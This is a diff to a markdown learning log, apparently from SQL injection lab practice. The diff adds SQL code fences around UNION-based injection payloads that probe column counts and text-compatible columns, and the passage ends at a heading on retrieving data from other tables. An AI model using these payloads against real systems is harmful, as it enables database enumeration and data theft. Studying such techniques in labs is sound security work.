@@ -22,19 +22,19 @@ I practiced using UNION-based SQL injection to interact with the results returne
 ### Determining the Number of Columns
 
 I used NULL values to determine how many columns were returned by the original query.
-
+```SQL
     ' UNION SELECT NULL--
     ' UNION SELECT NULL,NULL--
-
+```
 ### Finding a Column Containing Text
 
 After determining the number of columns, I tested which columns were compatible with text data.
-
+```SQL
     ' UNION SELECT NULL,NULL,NULL--
     ' UNION SELECT 'abcdef',NULL,NULL--
     ' UNION SELECT NULL,'abcdef',NULL--
     ' UNION SELECT NULL,NULL,'abcdef'--
-
+```
 ### Retrieving Data from Other Tables
 
 After identifying the correct columns, I used UNION SELECT to retrieve information from another table.
